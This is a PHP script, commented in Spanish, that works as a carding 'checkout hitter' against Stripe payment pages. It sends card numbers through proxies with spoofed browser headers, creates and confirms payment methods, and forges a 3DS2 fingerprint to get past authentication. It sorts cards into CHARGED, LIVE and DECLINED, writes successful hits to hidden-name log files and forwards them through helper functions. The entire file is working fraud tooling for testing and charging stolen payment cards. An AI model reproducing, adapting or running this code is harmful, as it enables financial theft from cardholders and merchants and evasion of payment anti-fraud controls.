<?php
include "functions.php";
$count = 0;


// Etiqueta para reintentar en caso de error
retry:
// Inicializa cURL
$ch = curl_init();


// Establece opciones de cURL
curl_setopt($ch, CURLOPT_PROXY, $ip);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $port);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$cslive.'/init');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'key='.$pklive.'&eid=NA&browser_locale=en-US&redirect_type=url');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json',
    'content-type: application/x-www-form-urlencoded',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
]);

// Ejecuta cURL y guarda la respuesta
$response = curl_exec($ch);

// Cierra cURL
curl_close($ch);

// Decodifica la respuesta JSON
$json = json_decode($response, true);

// Verifica si la respuesta es nula
if ($json === null) {
    echo "INIT RESPONSE: $response";
} else {
    // Verifica si hay un error en la respuesta
    if (isset($json['error'])) {
        $errorCode = $json['error']['code'];
        $errorMessage = $json['error']['message'];
        echo '<b style="color:#FFFFFF;"> DECLINED ' . $card . ' ➔ ' . $errorCode . ' MESSAGE : ' . $errorMessage . ' [Retries: ' . $count . '] </b> <br>';
        return;
    } else {
        $initChecksum = $json['init_checksum'];
        $coname = $json['account_settings']['display_name'];
    }
}

// Obtiene el monto a pagar
if (isset($json['line_item_group']['line_items'][0]['total'])) {
    $amount = $json['line_item_group']['line_items'][0]['total'];
} elseif (isset($json['invoice']['total'])) {
    $amount = $json['invoice']['total'];
} elseif (isset($json['line_item_group']['total'])) {
    $amount = $json['line_item_group']['total'];
} 

// Inicializa cURL para crear el método de pago
$ch = curl_init();

// Establece opciones de cURL
curl_setopt($ch, CURLOPT_PROXY, $ip);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $port);
$headers = array(
    'accept: application/json',
    'content-type: application/x-www-form-urlencoded'
);
$data = array(
    'type' => 'card',
    'card[number]' => $cc,
    'card[exp_month]' => $mm,
    'card[exp_year]' => $yy,
    'billing_details[name]' => $fname . ' ' . $lname,
    'billing_details[email]' => $email,
    'billing_details[address][country]' => 'PH',
    'key' => $pklive,
    'payment_user_agent' => 'stripe.js/c5d6d3bd0a;+stripe-js-v3/c5d6d3bd0a;+checkout'
);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

// Ejecuta cURL y guarda la respuesta
$response = curl_exec($ch);

// Verifica si la respuesta es falsa
if ($response === false) {
    echo 'cURL error: ' . curl_error($ch);
}

// Cierra cURL
curl_close($ch);

// Decodifica la respuesta JSON
$json = json_decode($response, true);

// Verifica si se ha creado un método de pago
if ($json !== null && isset($json['id'])) {
    $newpm = $json['id'];
    $pm = '{"id":"' . $newpm . 'NK5y"';
    $newpm_enc = get_js_encoded_string($pm);
} else {
    // Verifica si hay un mensaje de error
    $message = isset($json['error']['message']) ? $json['error']['message'] : '';
    if ($message) {
        echo '<span class="badge bg-success"><b>IP : '.$ips.'</b></span><b style="color:#FFFFFF;"> DECLINED ' . $card . ' ➔ ' . $message . ' [Retries: ' . $count . '] </b> <br>';
        return;
    } elseif (strpos($result, 'You passed')) {
        $count++;
        goto retry;
    }
}

// Inicializa cURL para confirmar la página de pago
$ch = curl_init();

// Establece opciones de cURL
curl_setopt($ch, CURLOPT_PROXY, $ip);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $port);
$data = array(
    'eid' => 'NA',
    'payment_method' => $newpm,
    'expected_amount' => $amount,
    'expected_payment_method_type' => 'card',
    'key' => $pklive,
    'version' => 'c5d6d3bd0a',
    'init_checksum' => $initChecksum,
    'js_checksum' => $newpm_enc
);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$cslive.'/confirm');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

// Ejecuta cURL y guarda la respuesta
$response = curl_exec($ch);

// Cierra cURL
curl_close($ch);

// Decodifica la respuesta JSON
$json = json_decode($response, true);

// Obtiene información necesaria para la siguiente etapa
$payatt = $json['payment_intent']['next_action']['use_stripe_sdk']['three_d_secure_2_source'];
$servertrans = $json['payment_intent']['next_action']['use_stripe_sdk']['server_transaction_id'];
$result = '{"threeDSServerTransID":"'.$servertrans.'"}';
$enc_server = base64_encode($result);
$secret = $json['payment_intent']['client_secret'] ?? null;
$pi = $json['payment_intent']['id'] ?? null;
$message = $json['error']['message'] ?? null;
$dcode = $json['error']['decline_code'] ?? null;
$code = $json['error']['code'] ?? null;
$status = $json['status'] ?? null;
$surl = $json['success_url'] ?? null;

// Verifica si el estado es exitoso
if ($status == 'succeeded') {
    $cardInfo = "Checkout INFO : $coname \nCard: $card \nSURL: $surl \nProxy IP: $ip \nProxy Pass: $port";
    fwrite(fopen("1t0u12adjkjasd8912h4hksadnasdjfjfj----CHARGEDDDDDDDDDDD.txt", "a"), $cardInfo . " \r\n\n");
    echo '<div style="color:#FFFFFF;">IP: '.$ips.' <b>#CHARGED '.$card.' ➔ Checkout Successful! - CLICK HERE TO VIEW THE <a href="'.$surl.'">RECEIPT</a></b></div><br>';
    forwardCharged($cardInfo);
    return;
}
// Verifica si hay fondos insuficientes
elseif (strpos($response, 'insufficient_funds')) {
    echo '<b style="color:#FFFFFF;">IP: '.$ips.' <b><b style="color:#FFFFFF;"> #LIVE '.$card.' ➔ '.$message.' [Retries: '.$count.']</b><br>';
    $cardInfo = "Checkout INFO : $coname \nCard: $card \STATUS: $message \nProxy IP: $ip \nProxy Pass: $port";
    fwrite(fopen("1t0u12adjkjasd8912h4hksadnasdjfjfj----INSUFFFFFFFFF.txt", "a"), $cardInfo . " \r\n\n");
    forwardInsuff($cardInfo);
    return;
}
// Verifica si se activa el hCaptcha
elseif (strpos($response, '"verification_url": "')) {
  echo '<span class="badge bg-success"><b>IP : '.$ips.'</b></span><span class="badge bg-danger"><b>DECLINED '.$card.' ➔ HCAPTCHA TRIGGERED [Retries: '.$count.']</b></span><br>';
  return;
}

// Realiza la autenticación 3DS2
$headers = array(
    'accept: application/json',
    'content-type: application/x-www-form-urlencoded',
    'referer: https://js.stripe.com/',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
);

// Crear un array con los datos para la autenticación 3DS2
$data = array(
  'source' => $payatt,
  'browser' => '{"fingerprintAttempted":true,"fingerprintData":"' . $enc_server . '","challengeWindowSize":null,"threeDSCompInd":"Y","browserJavaEnabled":false,"browserJavascriptEnabled":true,"browserLanguage":"en-US","browserColorDepth":"24","browserScreenHeight":"864","browserScreenWidth":"1536","browserTZ":"-480","browserUserAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"}',
  'one_click_authn_device_support[hosted]' => 'false',
  'one_click_authn_device_support[same_origin_frame]' => 'false',
  'one_click_authn_device_support[spc_eligible]' => 'true',
  'one_click_authn_device_support[webauthn_eligible]' => 'true',
  'one_click_authn_device_support[publickey_credentials_get_allowed]' => 'true',
  'key' => $pklive
);

// Inicializar cURL y configurar opciones
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $ip);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $port);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/3ds2/authenticate');
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

// Ejecutar solicitud y cerrar cURL
$response = curl_exec($ch);
curl_close($ch);

// Decodificar respuesta JSON
$json = json_decode($response, true);

// Verificar si el estado es 'challenge_required'
if ($json && isset($json['state'])) {
  $state = $json['state'];
  if ($state === 'challenge_required') {
      echo '<span class="badge bg-success"><b>IP : '.$ips.'</b></b></span><span class="badge bg-success"><b>IP : '.$ips.'</b></span><span class="badge bg-danger"><b>DECLINED '.$card.' ➔ 3DS BIN: '.$state.' [Retries: '.$count.']</b></span><br>';
      return;
  }
}

// Inicializar cURL y configurar opciones para obtener el estado de la transacción
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $ip);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $port);
curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/payment_intents/$pi?key=$pklive&is_stripe_sdk=false&client_secret=$secret");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: api.stripe.com',
    'accept: application/json',
    'accept-language: en-US,en;q=0.9',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
]);

// Ejecutar solicitud y cerrar cURL
$extract = json_decode($result = curl_exec($ch), true);
curl_close($ch);

// Obtener datos de la respuesta
$status = $extract['status'];
$errormes = $extract['error']['message'];
$message = $extract['last_payment_error']['message'];
$dcode = $extract['last_payment_error']['decline_code'];
$code = $extract['last_payment_error']['code'];

// Verificar el estado de la transacción y realizar acciones según el resultado
if ($status == 'succeeded') {
  $cardInfo = "Checkout INFO : $coname \nCard: $card \nSURL: $surl \nProxy IP: $ip \nProxy Pass: $port";
  fwrite(fopen("1t0u12adjkjasd8912h4hksadnasdjfjfj----CHARGEDDDDDDDDDDD.txt", "a"), $cardInfo . " \r\n\n");
  /* echo '<div style="color:#FFFFFF;">IP: '.$ips.' <b>#CHARGED '.$card.' ➔ Checkout Successful! - CLICK HERE TO VIEW THE <a href="'.$surl.'">RECEIPT</a></b></div><br>'; */
  //echo '<div style="color:#FFFFFF;"><b>#CHARGED IP: '.$ips.'</b>Card: '.$card.' </b>Result: Checkout Successful! </b>Producto: '.$coname.' </b>Receipt: <a href="'.$surl.'">CLICK HERE TO VIEW THE RECEIPT</a></div><br>';
  echo '&lt;div style=\"background-color: #000000; font-family: Courier New, Courier, monospace; color: #00FF00;\">&lt;b>#CHARGED IP: '.$ips.'&lt;/b> Card: '.$card.' &lt;/b> Result: Checkout Successful! &lt;/b> Producto: '.$coname.' &lt;/b> Receipt: &lt;a href=\"'.$surl.'\" style=\"color: #00FF00; text-decoration: none;\">CLICK HERE TO VIEW THE RECEIPT&lt;/a>&lt;/div>&lt;br>';
  
  forwardCharged($cardInfo);
  return;
} elseif (strpos($response, 'insufficient_funds')) {
  echo '<b style="color:#FFFFFF;">IP: '.$ips.' <b><b style="color:#FFFFFF;"> #LIVE '.$card.' ➔ '.$message.' [Retries: '.$count.']</b><br>';
  $cardInfo = "Checkout INFO : $coname \nCard: $card \STATUS: $message \nProxy IP: $ip \nProxy Pass: $port";
  fwrite(fopen("1t0u12adjkjasd8912h4hksadnasdjfjfj----INSUFFFFFFFFF.txt", "a"), $cardInfo . " \r\n\n");
  forwardInsuff($cardInfo);
  return;
} elseif (strpos($result, 'verify_challenge')) {
  echo '<span class="badge bg-success"><b>IP : '.$ips.'</b></span><span class="badge bg-danger"><b>DECLINED '.$card.' ➔ HCAPTCHA TRIGGERED [Retries: '.$count.']</b></span><br>';
} elseif (strpos($result, 'authentication_challenge')) {
  echo '<span class="badge bg-success"><b>IP : '.$ips.'</b></span><span class="badge bg-danger"><b>DECLINED '.$card.' ➔ Aunthentication Challenge [Retries: '.$count.']</b></span><br>';
} else {
  echo '<span class="badge bg-success"><b>IP : '.$ips.'</b></span> <span class="badge bg-danger"><b>DECLINED '.$card.' </span> ➔ <span class="badge bg-danger">[CODE: '.($dcode ? $dcode : $code).'] ➔ [MESSAGE: '.$message.'] [Retries: '.$count.']</b></span><br>';
}

// Limpiar variable $ch
unset($ch);

?>
